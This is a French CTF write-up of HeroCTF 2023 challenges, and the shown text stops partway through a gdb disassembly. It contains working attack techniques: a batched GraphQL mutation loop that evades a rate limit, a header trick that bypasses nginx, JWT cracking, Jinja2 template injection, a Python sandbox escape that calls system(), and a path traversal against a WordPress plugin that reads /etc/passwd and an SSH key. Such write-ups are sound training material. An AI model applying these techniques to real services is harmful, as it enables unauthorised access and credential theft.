# HeroCTF_WriteUp

Premier writeup de mes débuts dans le monde du CTF, lors du HeroCTF se déroulant du 12 au 14 mai 2023, merci aux organisateurs c’était cool ! Place de la team à la fin du CTF : 73/1085 c’est plutôt encourageant pour la suite !

<p align="center">
  <img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/cea372db-d925-40fd-8fcb-47f6c6a790e9" alt="team">
</p>

# Sommaire
- [Crypto](#crypto)
  - [Hyper Loop](#hyper-loop)
- [Web](#web)
  - [1 - Best schools](#1---best-schools)
  - [2 - Referrrrer](#2---referrrrer)
  - [3 - Drink from my Flask#1 (Non résolu)](#3---drink-from-my-flask1-non-résolu)
- [Misc](#misc)
  - [Pyjail](#pyjail)
- [Stegano](#stegano)
  - [LSD#2](#lsd2)
- [Forensic](#forensic)
  - [dev corp 1/4](#dev-corp-14)
- [Reverse engineering](#reverse-engineering)
  - [Scarface](#scarface)
  
# Crypto

## Hyper Loop

Premier challenge de cryptographie, on nous donne le code suivant :

```python
from os import urandom


flag = bytearray(b"Hero{????????????}")
assert len(flag) == 18

for _ in range(32):
    for i, c in enumerate(urandom(6) * 3):
        flag[i] = flag[i] ^ c

print(f"{flag = }")


"""
$ python3 hyper_loop.py 
flag = bytearray(b'\x05p\x07MS\xfd4eFPw\xf9}%\x05\x03\x19\xe8')
"""
```

À la vue du code on peut directement voir qu’un XOR est effectué sur chaque caractère du flag à partir d’une clé de 6 bytes générée aléatoirement, et répété 3 fois, ce qui couvre 18 bytes, donc la taille du flag.

Le XOR est une opération effectuée sur les bits de 2 valeurs. Si la comparaison montre que les deux bits sont identiques, le résultat sera false | 0 et s’ils sont différents, le XOR renvoie true | 1  :

```
01000001   (A ou 65)
XOR
01000010   (B ou 66)
--------
00000011   (3)
```

Le truc cool c’est que le XOR est reversible, par exemple un XOR entre 3 et 66 donnera 65.

En commentaire du code on retrouve le cipher du flag sous forme de bytes. Si on retrouve la clé, qu’on effectue un XOR entre la clé et les valeurs, on peut reconstituer le flag. Ça tombe bien puisque la clé est de 6 bytes, et que 6 caractères sont déjà visibles dans le message plus haut sous cette forme : **Hero{????????????}**

On a plus qu’à reconstituer la clé en faisant un XOR entre les valeurs ascii du message, et le cipher converti en valeur décimale.

Pour convertir le cipher en valeur décimale :

```python
flag = bytearray(b'\x05p\x07MS\xfd4eFPw\xf9}%\x05\x03\x19\xe8')

flag_decimal = [byte for byte in flag]
print(flag_decimal)
```

Voici le résultat : **[129, 99, 52, 1, 135, 84, 238, 31, 226, 8, 57, 110, 144, 10, 219, 12, 190, 102, 57, 42, 163, 84, 221, 21, 128, 102, 126, 16, 139, 70, 163]**

On XOR les 5 premières valeurs ainsi que la dernière avec les caractères visibles, on obtient la clé suivante : **77 21 117 34 40 149**

Maintenant, on reverse le XOR en utilisant cette clé sur le cipher pour obtenir le message en clair, je suis passé par mon [script python](https://github.com/Sleleu/xorcipher/blob/main/xorcipher.py) pour éviter de le faire à la mano : 

Et on obtient le flag !

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/56671346-f42a-495e-8538-5ae78fbf3e97" />
</p>

# Web

## **1 - Best schools**

On tombe sur un site de ranking d'écoles de cybersecurité.
L'objectif est de trouver un moyen faire passer la Flag Cybersecurity School en première position, la première ayant initialement déjà 1337 votes :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/e9aec5db-5cab-4ed5-bb13-35ded98f9328" />
</p>

À chaque nouveau clic, le nombre de vote s’incrémente.
Le problème étant qu’on ne peut cliquer qu’une fois toutes les 2 minutes environ sous peine de se retrouver avec cette popup :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/aade9466-226a-422f-9246-cbab94b817e8" />
</p>

Deux options s’offrent à nous :

- Passer 44 heures à cliquer toutes les 2 minutes pour obtenir les 1338 votes nécessaires
- Hack cette merde 🙂

En fouillant le code source du site on remarque une fonction intéressante :

```javascript
function updateNbClick(schoolName)
{
    var updated_school = [];
    fetch("/graphql", {
        method: "POST",
        headers:{
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: "${schoolName}"){schoolId, nbClick} }`})
    }).then(r => r.json())
    .then(
        function(data)
        {
            if(data.error != undefined)
            {
                alert(data.error)
            }
            document.getElementById(`click${data.data.increaseClickSchool.schoolId}`).innerHTML = data.data.increaseClickSchool.nbClick
        }
    )
}
```
C’est cette fonction côté client qui permet d’incrémenter le vote, et plus précisément après quelques recherches,
c’est cette mutation **************graphql************** qui fait le taff :

```javascript
mutation { increaseClickSchool(schoolName: "${schoolName}"){schoolId, nbClick} }
```
Ok, alors la variable nbClicks est inaccessible, et on ne peut pas envoyer plusieurs requêtes d’un seul coup.
Est-ce qu’il y aurait un moyen de bypass la limite de temps pour les requêtes ?
Après maintes tentatives et un harcèlement de GooglexChatgpt, j'ai pu trouver qu’il existait un type d’attaque pour ça : une attaque par lot, ou [GraphQL Batching Attack](https://lab.wallarm.com/graphql-batching-attack/). Pour la théorie, je vais laisser chatgpt expliquer pour moi : 

Un exemple typique d'une attaque par lots (batching attack) en GraphQL pourrait ressembler à ceci:

Imaginons que nous avons une application qui permet aux utilisateurs de chercher des livres dans une bibliothèque en ligne. L'application utilise GraphQL, et elle a une requête qui ressemble à ceci

```javascript
query {
  book(id: "123") {
    title
    author
    publishedDate
  }
}
```

Cette requête demande des informations sur un livre spécifique.

Maintenant, un attaquant pourrait tenter de surcharger le serveur en envoyant une requête qui demande des informations sur des milliers de livres à la fois, comme ceci :

```javascript
query {
  first: book(id: "1") { title }
  second: book(id: "2") { title }
  third: book(id: "3") { title }
  ...
  thousandth: book(id: "1000") { title }
}
```
Parfait, sans vouloir surcharger le serveur nous ce qui nous intéresse c’est d’incrémenter plusieurs fois le nombre de cliques en une unique requête. Go tester ça ?

```javascript
var mutationQuery = `mutation { 
    a: increaseClickSchool(schoolName: "Flag CyberSecurity School"){schoolId, nbClick}
    b: increaseClickSchool(schoolName: "Flag CyberSecurity School"){schoolId, nbClick}
  }`;
  
  fetch("/graphql", {
    method: "POST",
    headers:{
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({query: mutationQuery})
  });
```
Ça marche ! On a bien augmenté le nombre de clics de 2 en une seule requête. Le problème est que pour une mutation graphql, chaque instruction nécessite un nom et j’ai pas envie d’écrire 1000 noms random en C/C, 
donc petite boucle et ça part en first du classement des écoles ?

```javascript
var mutationQuery = 'mutation {';

  for(var i = 0; i < 1400; i++) {
    mutationQuery += `name${i}: increaseClickSchool(schoolName: "Flag CyberSecurity School"){schoolId, nbClick} `;
  }
  
  mutationQuery += '}';
  
  fetch("/graphql", {
    method: "POST",
    headers:{
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({query: mutationQuery})
  });
```
Erreur 413 Payload Too Large en sanction… Essayons avec seulement 1000 itérations dans ce cas :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/a57aa508-ba73-4beb-a434-c475ba26eade" />
</p>

zuuuper 🥵🥵🥵🥵🥵🥵🥵🥵🥵🥵🥵🥵

Il ne manque plus qu’à attendre 2 minutes, relancer le même payload, et récupérer le flag directement sur le site: **Hero{gr4phql_b4tch1ng_t0_byp4ss_r4t3_l1m1t_!!}**

## 2 - Referrrrer

Dans ce challenge, on dispose des fichiers sources du site web, dont le serveur nginx en premier lieu :

```
http {
    charset utf-8;

    access_log /dev/stdout;
    error_log /dev/stdout;

    upstream express_app {
        server app:3000;
    }

    server {
        listen 80;
        server_name example.com;

        location / {
            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location /admin {
            if ($http_referer !~* "^https://admin\.internal\.com") {
                return 403;
            }

            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

Puis le serveur express :

```javascript
const express = require("express")
const app = express()


app.get("/", (req, res) => {
    res.send("Hello World!");
})

app.get("/admin", (req, res) => {
    if (req.header("referer") === "YOU_SHOUD_NOT_PASS!") {
        return res.send(process.env.FLAG);
    }

    res.send("Wrong header!");
})

app.listen(3000, () => {
    console.log("App listening on port 3000");
})
```

On peut deviner que la vulnérabilité se situe au niveau du referer vu le nom du challenge, encore plus obvious sur la faille avec le refe**rrrrrrrrr**er bien insistant, mais ça je ne l’ai pas vu car je lis tout en diagonale.

Le referer c’est quoi ? C’est un header http, permettant d’indiquer dans la requête l’URL de provenance. Si tu es sur une page http://salut.fr/yo1, et que sur cette page il y a un bouton pour accéder à une page /yo2 la requête vers la page /yo2 contiendra en referer l’url de la page précédente /yo1.

Facile, il suffit donc d’indiquer le bon referer en accédant à la route /admin dans ce cas. J’ouvre **Burpsuite**, une petite requête vers le site du challenge passant par le proxy, je l’envoie dans le Repeater.

Premier problème, si j’envoie en Referer :

```
Referer:https://admin.internal.com
```

Le serveur Express évaluera sa condition à false et renverra "Wrong header!".

Et si je passe le bon referer pour Express :

```
Referer:YOU_SHOUD_NOT_PASS!
```

C’est nginx qui me répondra par un Forbidden 403.

L’idée est donc de valider ces deux conditions à la fois. En cherchant des infos en rapport avec le referer et express, on peut déjà voir en faisant un check de la documentation + CTRL F ‘referer’ que :


<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/a8278120-a499-44e4-8491-882897860562" />
</p>

Ok ils sont interchangeables pour Express, donc on peut mettre un referer nginx et un referrer express ? On tombe vite sur cette issue github qui apporte plus d’infos sur ce cas : https://github.com/expressjs/express/issues/3951

Il semble que le terme refe**rr**er est recherché en priorité par Express, et en fouillant le code source de [request.js](https://github.com/expressjs/express/blob/master/lib/request.js#L79), on voit effectivement cette priorité :

```javascript
switch (lc) {
    case 'referer':
    case 'referrer':
      return this.headers.referrer
        || this.headers.referer;
    default:
      return this.headers[lc];
  }
};
```
Testons donc ça tout de suite sur Burpsuite :

```http
GET /admin HTTP/1.1
Host: static-01.heroctf.fr:7000
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Referrer:YOU_SHOUD_NOT_PASS!
Referer:https://admin.internal.com
Content-Length: 23


Connection: close
```

On obtient finalement le flag en réponse !

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sat, 13 May 2023 13:20:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 38
Connection: keep-alive
X-Powered-By: Express
ETag: W/"26-Cj1P1GdO8Vke/DfJFC3B2cH95nw"

Hero{ba7b97ae00a760b44cc8c761e6d4535b}
```

## 3 - Drink from my Flask#1 (Non résolu)

Sur ce challenge, on nous explique qu’il s’agit d’un serveur web créé à partir du framework flask de python (j’y connais R), on tombe directement sur ce site :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/e7c137a2-e038-438f-b497-ffe3a2233e47"/>
</p>

Et en naviguant un peu au pif sur des routes, on apprend que deux routes semblent accessibles :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/af53187d-6179-4efa-b5a6-adfcdb4d0945"/>
</p>

Et lorsqu’on passe sur adminPage, on se fait bien entendu recaler :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/7e4fab29-8628-486e-8532-36bbc53f85d8"/>
</p>

Pendant que je place la requête sur le repeater de burpsuite, je vois ce cookie : 

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/3f72c786-bab7-44cd-8663-cf352440f320"/>
</p>

Voyons ce que ça donne sur le debugger de jwt.io :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/7c5765cc-5410-4c25-b1b2-f9e72ea424da"/>
</p>

Et si on essayait de crack le token et de se placer en admin pour accéder à cette page ? J’utilise l’outil JwtTool pour ça et je tente un bruteforce de base avec le dictionnaire rockyou.txt afin d’éventuellement trouver le secret du token :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/37237f5c-a1ce-4381-aa5c-9eab44f4cb6b"/>
</p>

Le secret était “key”…

J’encode un nouveau token avec le rôle admin, et le secret pour accéder en tant qu’admin à la page :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/aa9548d7-c8e6-403a-8d06-d84dd0f1c1d5"/>
</p>

J’envoie à nouveau une requête pour accéder à adminPage sous le rôle d’admin et :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/6e91a823-1ff4-4dcc-ae70-97cb6a357b99"/>
</p>

Sérieusement ? Juste un Welcome admin ?

Évidemment c’était bien trop facile et je n’ai pas vu passer la moindre notion de flask donc cherchons plutôt du côté des variables, testons une division par 0 pour voir comment le serveur se comporte :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/8f4ddd29-586d-4595-8aef-d597f1f12f92"/>
</p>

Petite erreur 500 c’est marrant mais ça a l’air de ne servir à rien dans ce contexte. En cherchant un peu côté payload flask j’ai enfin pu obtenir une réponse intéressante en testant un payload de Server-Side Template Injection:

![Capture d’écran du 2023-05-15 18-11-22](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/0df101ac-8caa-49a7-af2f-3186dcf0b62b)

On peut réussir à obtenir certaines données à partir de l’appel à **{{config}}** , malheureusement le flag ne se trouve pas directement dans la variable SECRET_KEY.

J’ai pu en déduire que ça tournait sur Jinja2 avec ces tests, ainsi qu’avec d’autres données obtenues avec quelques tentatives

![Capture d’écran du 2023-06-25 22-04-43](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/c0cc94ea-e0e6-414e-a1dc-546b2b7206db)

J’ai essayé de développer mon payload à partir de ce que j’ai vu sur certains writeups ainsi que sur Hacktricks, mais on tombe vite sur une size limit de payload :

![Capture d’écran du 2023-05-15 18-18-48](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/45ba17be-92ad-41bc-922e-b2513aedab23)

Comment bypass cette limite ?

C’est là que je me suis arrêté, manque de temps et de connaissances j’ai pas pu aller plus loin sur ce challenge malheureusement, d’après les writeup d’autres personnes du CTF : https://siunam321.github.io/ctf/HeroCTF-v5/Web/Drink-from-my-Flask-1/, on pouvait bypass cette limite en injectant le code pour obtenir une RCE directement dans le token.

# Misc

## Pyjail

Jamais fait de pyjail, au vu du challenge on peut se connecter en remote tcp avec nc :

```bash
nc dyn-02.heroctf.fr 14925
```

D’après  Hacktricks, on doit d’abord vérifier si on peut directement exécuter certaines commandes sensibles, ou importer certaines libraires, ça marche pas des masses :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/cfda7d99-3628-4cdc-9d46-c1a1aa11ab80"/>
</p>

En fouillant certains writeup, je tombe sur ce [dernier](https://ctftime.org/writeup/25816) et je teste ainsi le payload suivant : 

![Capture d’écran du 2023-05-15 16-33-22](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/f74bf35a-f896-4281-b656-09cb0806aad4)

On récupère finalement le flag ainsi que le code de la pyjail dans le fichier pyjail.py :

```python
>> "".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['s' + 'ys' + 'tem']('cat pyjail.py')   
#! /usr/bin/python3

# FLAG : Hero{nooooo_y0u_3sc4p3d!!}

def jail():
    user_input = input(">> ")

    filtered = ["eval", "exec"]
    
    valid_input = True
    for f in filtered:
        if f in user_input:
            print("You're trying something fancy aren't u ?")
            valid_input = False
            break
    for l in user_input:
        if ord(l) < 23 or ord(l) > 126:
            print("You're trying something fancy aren't u ?")
            valid_input = False
            break
    
    if valid_input:
        try:
            exec(user_input, {'__builtins__':{'print': print, 'globals': globals}}, {})
        except:
            print("An error occured. But which...")

def main():
    try:
        while True:
            jail()
    except KeyboardInterrupt:
        print("Bye")

if __name__ == "__main__":
```

# Stegano

## LSD#2

Voici l’image de ce challenge :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/ba13ac93-f85f-4739-9b80-65d716481b88" width="500" height="500"/>
</p>

Pour commencer, je lance un petit **exiftool sur l'image** au cas où il y aurait des données cachées mais je n’ai rien trouvé d’intéréssant, idem avec **strings**. Il y a eu un indice sur le challenge indiquant 200x200. Il y a sûrement quelque chose de caché dans l'image au sein de cette zone.

Je suis donc passé sur **gimp,**. Effectivement en examinant les pixels sur le coin 200x200, j’ai pu voir une petite différence de teinte entre le vert, passant de 100 à 99.6, idem pour la teinte LCH (aucune idée de ce que c’est).

J’ai pu lire que certaines techniques de stegano consistaient à cacher des informations dans les pixels des images en vérifiant les pixels :

> Texte provenant de http://planeteisn.fr/crypto/techniques.pdf
> 
> 
> 
> *Si l'on modifie ne serait-ce que le dernier bit de chaque couleur primaire
> composant la couleur de chaque pixel (soit plus simplement dit, le dernier chiffre de
> chacun des trois nombres du code RGB définissant la couleur) ou même les 2 derniers,
> cela serait imperceptible par l'oeil nu car la nuance ne serait que de 3 au maximum (11
> en binaire) sur 255 nuances possibles, ce qui est bien sûr trop peu pour être visible par
> un oeil humain. C'est de cette manière que sont dissimulés des messages dans une image
> : on converti le message en binaire puis on remplace les deux derniers bits du rouge du
> premier pixel par les deux premiers bits de l'information à cacher, puis les deux derniers
> bits du green par les deux suivants du texte, idem pour le vert puis on continue avec le
> pixel suivant. A la fin de l'opération, il est impossible de voir une différence entre
> l'image initiale et l'image qui sert de stégo-médium.*
> 
> *Exemple :*
> 
> *Prenons le message, « 110011001011 »*
> 
> *Avec la partie d'image : R = 10010100 G = 10110111 B = 10101010
> R = 10010101 G = 10111000 B = 10101110*
> 
> *On masque le message et on obtient :
> R = 10010111 G = 10110100 B = 10101011
> R = 10010100 G = 10110110 B = 10101011*
> 
> *La modification pour couleur primaire est donc entre 0 et 3 sur 255 soit totalement
> invisible.*

Super tout ça, si je ne lisais pas tout en diagonale, cette piste m’aurait sûrement fait gagner beaucoup de temps. Au lieu de ça je me suis plutôt amusé à jouer avec toutes les possibilités de modification des couleurs sur gimp, jusqu’à tomber par hasard sur ça : 

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/7f695ad8-db1e-414f-95b2-034f417bd890" width="700" height="700"/>
</p>

C’est à ce moment que j’ai testé tous les trucs les plus inutiles **pendant des heures** en espérant avoir une piste pour le flag :

- Décalquer le carré pour étirer des pixels
- Superposer plusieurs claques en verticale
- Inverser des ondes beta, alpha, utiliser des effets d’inversion de couleur

Au bout d’un moment je suis tombé sur ce site qui répertorie beaucoup d’outils de stégano : https://stegonline.georgeom.net/checklist

Sur ce site on peut notamment upload une image et appliquer beaucoup d’effets, dont le check de bit plane pour chaque couleur RGB. J’ai remarqué que c’était uniquement sur le bit green 0 qu’on pouvait très clairement voir le pavé de couleurs cachées :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/cd961edd-9921-46e4-bc28-b280c055a8d7" width="700" height="700"/>

Ok genius, il suffit d’extraire le binaire sur le canal green 0 et lire le message ! Pour ça, j’ai utilisé l'outil stegsolve qui me permet de créer un fichier binaire contenant uniquement les bits 0 de la couleur green. En utilisant la commande strings, on voit un début de texte en anglais, et à la fin de ce texte :

![Capture d’écran du 2023-05-15 15-38-38](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/0139082a-e8e6-40b7-8732-f2cbf9e69e1a)

“Here is your fl” YOUR QUOI ? Impossible de trouver le flag dans le texte, si ce n’est un morceau suspect ressemblant à une fin de flag juste après.

Wait, il n’y avait pas de bandes verticales sur l’image du canal 0 green, pourtant avec les options de gimp elles sont bien apparues, c’est donc la luminosité LCH ? Peut-être que si j’exfiltre les données de la photo modifiée sur gimp je vais pouvoir apercevoir le texte sur le binaire ?

![Capture d’écran du 2023-05-15 16-06-06](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/11e56ec5-b2fc-4574-982c-c50df7ae8eb0)

Bingo 🐸 La seconde partie du texte devait être incluse dans la luminosité de la photo, qui n’était pas apparent sur les couleurs RGB avant de modifier l’image depuis gimp ! Il suffit de fusionner les deux textes pour obtenir le flag complet : Hero{0NL1NE_700L_0V3RR473D}

# Forensic

## dev corp 1/4

Le challenge nous fournit un fichier access.log, et pour réussir le challenge, on doit trouver la CVE ainsi que le fichier le plus sensible. Un CTRL + F sur “pass” nous permet de voir un premier log suspect niveau vulnérabilité : 

> *internalproxy.devcorp.local - - [02/May/2023:13:12:29 +0000] "GET //wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../etc/passwd HTTP/1.1" 200 2240 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0”*
> 

À première vue ça ressemble à une **Directory Tranversal** : https://portswigger.net/web-security/file-path-traversal

Et en recherchant cette tentative de GET sur google, on tombe directement sur la CVE concernée : https://www.exploit-db.com/exploits/50420. Cette attaque a été réalisée 4 fois dans les logs, et le fichier le plus sensible semble être le backup de la key rsa :

```
../../../../../../../../../home/webuser/.ssh/id_rsa_backup
```

Et voici le flag : Hero{CVE-2020-11738:/home/webuser/.ssh/id_rsa_backup}

# Reverse engineering

## Scarface

Pour ce challenge un executable nous est fourni, et en le lançant, on obtient une simple question suivi d’une redirection vers Youtube : 

![Capture d’écran du 2023-05-15 19-11-35](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/a7a4e648-b441-4c87-8fdc-e8ed0eb8c4c7)

Un strings scarface nous laisse entrevoir quelques données de plus sur le programme mais rien de réellement utile. Il est donc temps pour moi de découvrir **Ghidra** et de décompiler un peu tout ça :

![Capture d’écran du 2023-05-15 19-17-30](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/f7cdbc61-6b7c-4d00-86a5-68555762677e)

On remarque plusieurs choses intéressantes sur ce code :

- Au départ, l’input est récupéré par un call à **fgets()**, le programme remplace le \n par un \0, et est vérifiée avec un 0x1f (31 en valeur décimale). Si la vérification retourne false, le programme call une fonction fail(), ce qui est évidemment pas ce nous voulons puisque fail provoque un appel à exit() :

![Capture d’écran du 2023-05-15 19-21-36](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/37944da1-1ac9-4de3-8bbf-4078d6939b46)

Donc l’input doit faire 31 caractères. 

- Une variable **local_28** est crée, contenant la vidéo youtube, et son adresse avance jusqu’au ‘=’. Ensuite cette variable est envoyée en paramètre à une fonction **UNO_REVERSE_CARD()**, renvoyant une string **__s_00**.
- Cette variable __s_00 est envoyée dans une fonction **decode**() avec sa taille, ainsi que pvVar2, un pointeur déclaré auparavant.
- Enfin, un XOR est effectué sur chaque caractère de ces variables et comparé à une autre variable **DAT_00102050**

En examinant de plus près les fonctions UNO_REVERSE_CARD() et decode() :

![Capture d’écran du 2023-05-15 19-32-06](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/0f407056-5424-42de-aca4-e98b75ca0589)

On comprend que c’est une façon super brouillon (pour l’être humain) d’inverser une string, donc cette partie du code devrait récupérer ceci : "=Olgn9sXNdl0” qui est l’ID de la vidéo YouTube, et retourner ceci : “0ldNXs9nglO=”

Ce résultat est passé dans la fonction decode() :

```c
uint decode(long param_1,uint param_2,long param_3)

{
  byte bVar1;
  uint uVar2;
  uint local_10;
  uint local_c;
  
  if ((param_2 & 3) == 0) {
    local_c = 0;
    local_10 = 0;
    while( true ) {
      if (param_2 <= local_10) {
        return local_c;
      }
      if (*(char *)(param_1 + (ulong)local_10) == '=') {
        return local_c;
      }
      if ((*(byte *)(param_1 + (ulong)local_10) < 0x2b) ||
         (0x7a < *(byte *)(param_1 + (ulong)local_10))) break;
      bVar1 = decode_table[(int)(uint)*(byte *)(param_1 + (ulong)local_10)];
      if (bVar1 == 0xff) {
        return 0;
      }
      uVar2 = local_10 & 3;
      if (uVar2 == 3) {
        *(byte *)((ulong)local_c + param_3) = *(byte *)(param_3 + (ulong)local_c) | bVar1;
        local_c = local_c + 1;
      }
      else if (uVar2 < 4) {
        if (uVar2 == 2) {
          *(byte *)(param_3 + (ulong)local_c) =
               bVar1 >> 2 & 0xf | *(byte *)(param_3 + (ulong)local_c);
          *(byte *)(param_3 + (ulong)(local_c + 1)) = bVar1 << 6;
          local_c = local_c + 1;
        }
        else if (uVar2 < 3) {
          if (uVar2 == 0) {
            *(byte *)(param_3 + (ulong)local_c) = bVar1 * '\x04';
          }
          else if (uVar2 == 1) {
            *(byte *)(param_3 + (ulong)local_c) =
                 bVar1 >> 4 & 3 | *(byte *)(param_3 + (ulong)local_c);
            *(byte *)(param_3 + (ulong)(local_c + 1)) = bVar1 << 4;
            local_c = local_c + 1;
          }
        }
      }
      local_10 = local_10 + 1;
    }
  }
  return 0;
}
```

Cette fonction (merci chatgpt encore) semble convertir une chaine [base64](https://www.123calculus.com/conversion-base64-page-88-20-150.html). Je n'ai pas scruté le reste de la fonction puisque connaissant dorénavant son but, j’ai simplement utilisé [cyberchef](https://gchq.github.io/CyberChef/) pour convertir la string en base64 vers des valeurs décimales, ce qui m’a donné l’une des clés nécessaires à ce cracking : **210 87 77 94 207 103 130 83**

Pourquoi ? Parce qu'à ce moment je pense à la même stratégie que pour Hyper Loop, reverse le XOR entre ces deux valeurs et obtenir le mot de passe permettant d'avancer dans le programme.

Maintenant, j’aimerais bien savoir le contenu de **DAT_00102050** qui est comparé avec l’input.

On passe sur le debuggeur gdb pour tenter d’avoir un accès à ces variables. Je fais un petit dump du main :

```assembly
Dump of assembler code for function main:
   0x00000000000014fa <+0>:	endbr64 
   0x00000000000014fe <+4>:	push   %rbp
   0x00000000000014ff <+5>:	mov    %rsp,%rbp
   0x0000000000001502 <+8>:	sub    $0x40,%rsp
   0x0000000000001506 <+12>:	mov    %edi,-0x34(%rbp)
   0x0000000000001509 <+15>:	mov    %rsi,-0x40(%rbp)
   0x000000000000150d <+19>:	mov    $0x40,%edi
   0x0000000000001512 <+24>:	call   0x1120 <malloc@plt>
   0x0000000000001517 <+29>:	mov    %rax,-0x18(%rbp)
   0x000000000000151b <+33>:	mov    $0x40,%edi
   0x0000000000001520 <+38>:	call   0x1120 <malloc@plt>
   0x0000000000001525 <+43>:	mov    %rax,-0x10(%rbp)
   0x0000000000001529 <+47>:	lea    0xc38(%rip),%rax        # 0x2168
   0x0000000000001530 <+54>:	mov    %rax,%rdi
   0x0000000000001533 <+57>:	mov    $0x0,%eax
   0x0000000000001538 <+62>:	call   0x10f0 <printf@plt>
   0x000000000000153d <+67>:	mov    0x2adc(%rip),%rdx        # 0x4020 <stdin@GLIBC_2.2.5>
   0x0000000000001544 <+74>:	mov    -0x18(%rbp),%rax
   0x0000000000001548 <+78>:	mov    $0x3f,%esi
   0x000000000000154d <+83>:	mov    %rax,%rdi
   0x0000000000001550 <+86>:	call   0x1110 <fgets@plt>
   0x0000000000001555 <+91>:	mov    -0x18(%rbp),%rax
   0x0000000000001559 <+95>:	lea    0xc28(%rip),%rdx        # 0x2188
   0x0000000000001560 <+102>:	mov    %rdx,%rsi
   0x0000000000001563 <+105>:	mov    %rax,%rdi
   0x0000000000001566 <+108>:	call   0x1100 <strcspn@plt>
   0x000000000000156b <+113>:	mov    -0x18(%rbp),%rdx
   0x000000000000156f <+117>:	add    %rdx,%rax
   0x0000000000001572 <+120>:	movb   $0x0,(%rax)
   0x0000000000001575 <+123>:	mov    -0x18(%rbp),%rax
   0x0000000000001579 <+127>:	mov    %rax,%rdi
   0x000000000000157c <+130>:	call   0x10e0 <strlen@plt>
   0x0000000000001581 <+135>:	cmp    $0x1f,%rax
   0x0000000000001585 <+139>:	je     0x1591 <main+151>
   0x0000000000001587 <+141>:	mov    $0x0,%eax
   0x000000000000158c <+146>:	call   0x14bb <fail>
   0x0000000000001591 <+151>:	mov    0x2a78(%rip),%rax        # 0x4010 <check_this_out>
   0x0000000000001598 <+158>:	mov    %rax,-0x20(%rbp)
   0x000000000000159c <+162>:	jmp    0x15a3 <main+169>
   0x000000000000159e <+164>:	addq   $0x1,-0x20(%rbp)
   0x00000000000015a3 <+169>:	mov    -0x20(%rbp),%rax
   0x00000000000015a7 <+173>:	movzbl (%rax),%eax
   0x00000000000015aa <+176>:	cmp    $0x3d,%al
   0x00000000000015ac <+178>:	jne    0x159e <main+164>
   0x00000000000015ae <+180>:	mov    -0x20(%rbp),%rax
   0x00000000000015b2 <+184>:	mov    %rax,%rdi
   0x00000000000015b5 <+187>:	call   0x1229 <UNO_REVERSE_CARD>
   0x00000000000015ba <+192>:	mov    %rax,-0x20(%rbp)
   0x00000000000015be <+196>:	mov    -0x20(%rbp),%rax
   0x00000000000015c2 <+200>:	mov    %rax,%rdi
   0x00000000000015c5 <+203>:	call   0x10e0 <strlen@plt>
   0x00000000000015ca <+208>:	mov    %eax,%ecx
   0x00000000000015cc <+210>:	mov    -0x10(%rbp),%rdx
   0x00000000000015d0 <+214>:	mov    -0x20(%rbp),%rax
   0x00000000000015d4 <+218>:	mov    %ecx,%esi
   0x00000000000015d6 <+220>:	mov    %rax,%rdi
   0x00000000000015d9 <+223>:	call   0x12f3 <decode>
   0x00000000000015de <+228>:	mov    %eax,%eax
   0x00000000000015e0 <+230>:	mov    %rax,-0x8(%rbp)
   0x00000000000015e4 <+234>:	movl   $0x0,-0x24(%rbp)
   0x00000000000015eb <+241>:	jmp    0x163d <main+323>
   0x00000000000015ed <+243>:	mov    -0x24(%rbp),%eax
   0x00000000000015f0 <+246>:	movslq %eax,%rdx
